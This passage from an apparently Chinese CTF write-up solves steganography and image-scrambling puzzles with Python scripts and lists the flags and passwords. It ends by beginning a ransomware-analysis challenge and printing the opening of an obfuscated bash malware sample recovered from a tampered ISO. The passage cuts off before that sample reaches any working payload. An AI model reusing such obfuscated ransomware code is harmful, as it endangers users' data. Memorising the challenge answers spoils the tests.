</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;out.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>width</span><span class=p>,</span><span class=n>height</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl><span class=n>pix</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>load</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>new_img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s2>&#34;RGBA&#34;</span><span class=p>,</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>new_pix</span> <span class=o>=</span> <span class=n>new_img</span><span class=o>.</span><span class=n>load</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>height</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>width</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>b</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>r</span><span class=p>,</span> <span class=n>g</span> <span class=o>=</span> <span class=n>pix</span><span class=p>[</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=c1># 恢复亮度和对比度</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=p>(</span><span class=n>r</span> <span class=o>-</span> <span class=mi>10</span><span class=p>)</span> <span class=o>/</span> <span class=mf>0.01</span>
</span></span><span class=line><span class=cl>        <span class=n>g</span> <span class=o>=</span> <span class=p>(</span><span class=n>g</span> <span class=o>-</span> <span class=mi>10</span><span class=p>)</span> <span class=o>/</span> <span class=mf>0.01</span>
</span></span><span class=line><span class=cl>        <span class=n>b</span> <span class=o>=</span> <span class=p>(</span><span class=n>b</span> <span class=o>-</span> <span class=mi>10</span><span class=p>)</span> <span class=o>/</span> <span class=mf>0.01</span>
</span></span><span class=line><span class=cl>        <span class=n>a</span> <span class=o>=</span> <span class=p>(</span><span class=n>a</span> <span class=o>-</span> <span class=mi>10</span><span class=p>)</span> <span class=o>/</span> <span class=mf>0.01</span>
</span></span><span class=line><span class=cl>        <span class=n>new_pix</span><span class=p>[</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=p>),</span> <span class=nb>int</span><span class=p>(</span><span class=n>g</span><span class=p>),</span> <span class=nb>int</span><span class=p>(</span><span class=n>b</span><span class=p>),</span> <span class=nb>int</span><span class=p>(</span><span class=n>a</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>new_img</span><span class=o>.</span><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>new_img</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;flag.png&#34;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>最后扫码即可得到flag：<code>flag{5fbb5f2b0f9234576d2742f225044463}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217164317654.png alt=/posts/bb1da35/imgs/image-20241217164317654.png height=1473 width=2556></p><h2 class=heading-element id=题目名称-外星的凯撒凯撒凯撒><span>题目名称 外星的凯撒凯撒凯撒</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e5%a4%96%e6%98%9f%e7%9a%84%e5%87%af%e6%92%92%e5%87%af%e6%92%92%e5%87%af%e6%92%92 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>解压附件，可以得到一个DOCX还有一个加密的压缩包</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217170952765.png alt=/posts/bb1da35/imgs/image-20241217170952765.png height=865 width=1723></p><p>打开DOCX文件，发现里面有一部分文字是白色的，直接全部修改为红色并去除所有格式</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217171536175.png alt=/posts/bb1da35/imgs/image-20241217171536175.png height=1530 width=2559></p><p>然后发现有很多行base64编码，猜测是base64隐写</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217171656620.png alt=/posts/bb1da35/imgs/image-20241217171656620.png height=1113 width=1504></p><p>直接PZ解base64隐写可以得到：<code>The ciphertext is:I0qwVtx2ft</code></p><p>然后我们在DOCX中调大缩放，可以看到有一个4music.wav的图标，直接双击即可打开一个wav</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217171854306.png alt=/posts/bb1da35/imgs/image-20241217171854306.png height=1528 width=2560></p><p>播放发现是SSTV，扫描后可以得到密钥：<code>ccttttf</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217182044190.png alt=/posts/bb1da35/imgs/image-20241217182044190.png height=243 width=1734></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217182052665.png alt=/posts/bb1da35/imgs/image-20241217182052665.png height=240 width=320></p><p>然后维吉尼亚解密即可得到压缩包解压密码：<code>G0odCae2ar</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217182259005.png alt=/posts/bb1da35/imgs/image-20241217182259005.png height=1473 width=2556></p><p>使用得到的密码解压压缩包后可以得到一个flag.xlsx</p><p>把后缀改为.zip然后解压，在sheet1.xml中可以发现有很多内容，因此猜测是设置了特殊格式</p><p>然后根据 400行x400列 猜测是藏了一个二维码</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217182445544.png alt=/posts/bb1da35/imgs/image-20241217182445544.png height=1528 width=2560></p><p>因此我们打开flag.xlsx文件，仔细观察发现有的单元格字体是加粗的，我们把加粗的单元格都涂黑</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217182709212.png alt=/posts/bb1da35/imgs/image-20241217182709212.png height=1528 width=2560></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217182740720.png alt=/posts/bb1da35/imgs/image-20241217182740720.png height=1528 width=2560></p><p>然后调整一下列宽得到一张二维码</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217182855783.png alt=/posts/bb1da35/imgs/image-20241217182855783.png height=1528 width=2560></p><p>最后扫码即可得到flag：<code>flag{Cae2ar+Cae2ar+Cae2ar+...=Vigenre}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217183113697.png alt=/posts/bb1da35/imgs/image-20241217183113697.png height=889 width=1962></p><h2 class=heading-element id=题目名称-图的点很奇怪><span>题目名称 图的点很奇怪</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e5%9b%be%e7%9a%84%e7%82%b9%e5%be%88%e5%a5%87%e6%80%aa class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一张PNG图片还有一个加密的ZIP压缩包，猜测需要从PNG图片中获取压缩包的解压密码</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241218193239301.png alt=/posts/bb1da35/imgs/image-20241218193239301.png height=865 width=1723></p><p>用010打开这张PNG图片，提示报错，仔细观察发现是图片chunk的CTYPE被修改了，尝试改回IDAT</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241218193434241.png alt=/posts/bb1da35/imgs/image-20241218193434241.png height=1528 width=2560></p><p>然后发现图片末尾有多余的数据，尝试删除多余的数据</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241218193558124.png alt=/posts/bb1da35/imgs/image-20241218193558124.png height=1528 width=2560></p><p>多余的数据删除后，图片就可以正常显示了，010中打开也没有报错了</p><p>放大图片查看，发现图片中有很多间隔相同的小点，猜测是隐写了另一张图片</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241218193727094.png alt=/posts/bb1da35/imgs/image-20241218193727094.png height=1108 width=1902></p><p>因此我们尝试提取等距像素点，可以提取出来下面这张图片</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241218193916026.png alt=/posts/bb1da35/imgs/image-20241218193916026.png height=180 width=320></p><p>因此压缩包的解压密码就是：<code>$df&amp;vK1RGqoj</code>，用得到的压缩包密码解压后可以得到下图</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241218194027697.png alt=/posts/bb1da35/imgs/image-20241218194027697.png height=180 width=320></p><p>010打开上图，发现末尾藏了一张数据逆置后的PNG图片</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241218194114298.png alt=/posts/bb1da35/imgs/image-20241218194114298.png height=1528 width=2560></p><p>直接把末尾的数据复制出来CyberChef转换一下即可得到flag：<code>flag{d4405ce1-3aac-ffb1-68af11-7d93e2066a}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241218194211209.png alt=/posts/bb1da35/imgs/image-20241218194211209.png height=1476 width=2559></p><h2 class=heading-element id=题目名称-cat技能兴鲁><span>题目名称 cat(技能兴鲁)</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-cat%e6%8a%80%e8%83%bd%e5%85%b4%e9%b2%81 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一个cat_encode.py还有一张cat.png</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241218194619452.png alt=/posts/bb1da35/imgs/image-20241218194619452.png height=460 width=460></p><p>cat_encode.py的内容如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>arnold_encode</span><span class=p>(</span><span class=n>image</span><span class=p>,</span> <span class=n>shuffle_times</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>arnold_image</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>zeros</span><span class=p>(</span><span class=n>shape</span><span class=o>=</span><span class=n>image</span><span class=o>.</span><span class=n>shape</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span><span class=p>,</span> <span class=n>w</span> <span class=o>=</span> <span class=n>image</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>image</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>N</span> <span class=o>=</span> <span class=n>h</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>time</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>shuffle_times</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>ori_x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>ori_y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>new_x</span> <span class=o>=</span> <span class=p>(</span><span class=mi>1</span><span class=o>*</span><span class=n>ori_x</span> <span class=o>+</span> <span class=n>b</span><span class=o>*</span><span class=n>ori_y</span><span class=p>)</span><span class=o>%</span> <span class=n>N</span>
</span></span><span class=line><span class=cl>                <span class=n>new_y</span> <span class=o>=</span> <span class=p>(</span><span class=n>a</span><span class=o>*</span><span class=n>ori_x</span> <span class=o>+</span> <span class=p>(</span><span class=n>a</span><span class=o>*</span><span class=n>b</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=n>ori_y</span><span class=p>)</span> <span class=o>%</span> <span class=n>N</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>arnold_image</span><span class=p>[</span><span class=n>new_x</span><span class=p>,</span> <span class=n>new_y</span><span class=p>,</span> <span class=p>:]</span> <span class=o>=</span> <span class=n>image</span><span class=p>[</span><span class=n>ori_x</span><span class=p>,</span> <span class=n>ori_y</span><span class=p>,</span> <span class=p>:]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>image</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>copy</span><span class=p>(</span><span class=n>arnold_image</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>cv2</span><span class=o>.</span><span class=n>imwrite</span><span class=p>(</span><span class=s1>&#39;cat.png&#39;</span><span class=p>,</span> <span class=n>arnold_image</span><span class=p>,</span> <span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>cv2</span><span class=o>.</span><span class=n>IMWRITE_PNG_COMPRESSION</span><span class=p>),</span> <span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>arnold_image</span></span></span></code></pre></td></tr></table></div></div><p>很明显就是经典的arnold猫脸变换了，但是没有给我们shuffle_times、a、b</p><p>因此猜测需要我们进行爆破，编写以下脚本进行爆破即可，当然能爆破的前提是三个值都不会太大</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>matplotlib.pyplot</span> <span class=k>as</span> <span class=nn>plt</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>cv2</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>arnold_decode</span><span class=p>(</span><span class=n>image</span><span class=p>,</span> <span class=n>shuffle_times</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34; decode for rgb image that encoded by Arnold
</span></span></span><span class=line><span class=cl><span class=s2>    Args:
</span></span></span><span class=line><span class=cl><span class=s2>        image: rgb image encoded by Arnold
</span></span></span><span class=line><span class=cl><span class=s2>        shuffle_times: how many times to shuffle
</span></span></span><span class=line><span class=cl><span class=s2>    Returns:
</span></span></span><span class=line><span class=cl><span class=s2>        decode image
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># 1:创建新图像</span>
</span></span><span class=line><span class=cl>    <span class=n>decode_image</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>zeros</span><span class=p>(</span><span class=n>shape</span><span class=o>=</span><span class=n>image</span><span class=o>.</span><span class=n>shape</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 2：计算N</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span><span class=p>,</span> <span class=n>w</span> <span class=o>=</span> <span class=n>image</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>image</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>N</span> <span class=o>=</span> <span class=n>h</span>  <span class=c1># 或N=w</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 3：遍历像素坐标变换</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>time</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>shuffle_times</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>ori_x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>ori_y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=c1># 按照公式坐标变换</span>
</span></span><span class=line><span class=cl>                <span class=n>new_x</span> <span class=o>=</span> <span class=p>((</span><span class=n>a</span> <span class=o>*</span> <span class=n>b</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>ori_x</span> <span class=o>+</span> <span class=p>(</span><span class=o>-</span><span class=n>b</span><span class=p>)</span> <span class=o>*</span> <span class=n>ori_y</span><span class=p>)</span> <span class=o>%</span> <span class=n>N</span>
</span></span><span class=line><span class=cl>                <span class=n>new_y</span> <span class=o>=</span> <span class=p>((</span><span class=o>-</span><span class=n>a</span><span class=p>)</span> <span class=o>*</span> <span class=n>ori_x</span> <span class=o>+</span> <span class=n>ori_y</span><span class=p>)</span> <span class=o>%</span> <span class=n>N</span>
</span></span><span class=line><span class=cl>                <span class=n>decode_image</span><span class=p>[</span><span class=n>new_x</span><span class=p>,</span> <span class=n>new_y</span><span class=p>,</span> <span class=p>:]</span> <span class=o>=</span> <span class=n>image</span><span class=p>[</span><span class=n>ori_x</span><span class=p>,</span> <span class=n>ori_y</span><span class=p>,</span> <span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>image</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>copy</span><span class=p>(</span><span class=n>decode_image</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>image</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>arnold_brute</span><span class=p>(</span><span class=n>image</span><span class=p>,</span><span class=n>shuffle_times_range</span><span class=p>,</span><span class=n>a_range</span><span class=p>,</span><span class=n>b_range</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>shuffle_times_range</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>shuffle_times_range</span><span class=p>[</span><span class=mi>1</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>a</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>a_range</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>a_range</span><span class=p>[</span><span class=mi>1</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>b_range</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>b_range</span><span class=p>[</span><span class=mi>1</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Trying shuffle_times=</span><span class=si>{</span><span class=n>c</span><span class=si>}</span><span class=s2> a=</span><span class=si>{</span><span class=n>a</span><span class=si>}</span><span class=s2> b=</span><span class=si>{</span><span class=n>b</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>decoded_img</span> <span class=o>=</span> <span class=n>arnold_decode</span><span class=p>(</span><span class=n>image</span><span class=p>,</span><span class=n>c</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>output_filename</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;flag_decodedc</span><span class=si>{</span><span class=n>c</span><span class=si>}</span><span class=s2>_a</span><span class=si>{</span><span class=n>a</span><span class=si>}</span><span class=s2>_b</span><span class=si>{</span><span class=n>b</span><span class=si>}</span><span class=s2>.png&#34;</span>
</span></span><span class=line><span class=cl>                <span class=n>cv2</span><span class=o>.</span><span class=n>imwrite</span><span class=p>(</span><span class=n>output_filename</span><span class=p>,</span> <span class=n>decoded_img</span><span class=p>,</span> <span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>cv2</span><span class=o>.</span><span class=n>IMWRITE_PNG_COMPRESSION</span><span class=p>),</span> <span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>cv2</span><span class=o>.</span><span class=n>imread</span><span class=p>(</span><span class=s2>&#34;cat.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>arnold_brute</span><span class=p>(</span><span class=n>img</span><span class=p>,</span> <span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>6</span><span class=p>),</span> <span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>11</span><span class=p>),</span> <span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>11</span><span class=p>))</span></span></span></code></pre></td></tr></table></div></div><p>最后发现当shuffle_times=3、a=6、b=9时可以得到下图</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241218200611778.png alt=/posts/bb1da35/imgs/image-20241218200611778.png height=460 width=460></p><p>因此最后的flag就是：<code>flag{022ae0e0-c61e-428c-9f76-2eb089a58348}</code></p><h2 class=heading-element id=题目名称-被偷梁换柱的镜像><span>题目名称 被偷梁换柱的镜像</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e8%a2%ab%e5%81%b7%e6%a2%81%e6%8d%a2%e6%9f%b1%e7%9a%84%e9%95%9c%e5%83%8f class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目背景如下：</p><blockquote><p>公司的运维人员使用了其U盘上的华为OpenEuler国产操作系统的ISO镜像，来给多台服务器安装系统，殊不知这些系统已经被悄悄的替换并嵌入了勒索病毒。。。多个月后，病毒偷偷的把数据加密了，你能帮忙分析并解密吗？</p></blockquote><p>附件给了一个被加密的文件还有一个ISO镜像文件</p><p>ISO镜像直接双击挂载或者用Disk Genius挂载可以得到安装的镜像<code>install.img</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241218131830249.png alt=/posts/bb1da35/imgs/image-20241218131830249.png height=1278 width=2104></p><p><code>install.img</code>因为系统格式不同，因此Windows下无法直接挂载</p><p>但是img镜像其实就是一个压缩包，用bandzip可能无法正常解压，但是我们可以使用7zip进行解压</p><p>第一层解压可以得到<code>rootfs.img</code>，再解压一层即可得到Linux的文件系统</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241218132121101.png alt=/posts/bb1da35/imgs/image-20241218132121101.png height=1278 width=2104></p><p>然后我们在<code>\rootfs\var\adm</code>路径下可以得到一个<code>runrunrun.bash</code>，内容如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>z</span><span class=o>=</span><span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>&#34;</span><span class=p>;</span><span class=nv>lDz</span><span class=o>=</span><span class=s1>&#39;Hz&#39;</span><span class=p>;</span><span class=nv>Oz</span><span class=o>=</span><span class=s1>&#39;id&#39;</span><span class=p>;</span><span class=nv>VFz</span><span class=o>=</span><span class=s1>&#39;y&#39;</span><span class=p>;</span><span class=nv>jDz</span><span class=o>=</span><span class=s1>&#39;$B&#39;</span><span class=p>;</span><span class=nv>TCz</span><span class=o>=</span><span class=s1>&#39;;G&#39;</span><span class=p>;</span><span class=nv>MEz</span><span class=o>=</span><span class=s1>&#39;gz&#39;</span><span class=p>;</span><span class=nv>GDz</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=se>\&#39;</span><span class=s1>&#39;j&#39;</span><span class=p>;</span><span class=nv>az</span><span class=o>=</span><span class=s1>&#39;&#34;&#39;</span><span class=p>;</span><span class=nv>OCz</span><span class=o>=</span><span 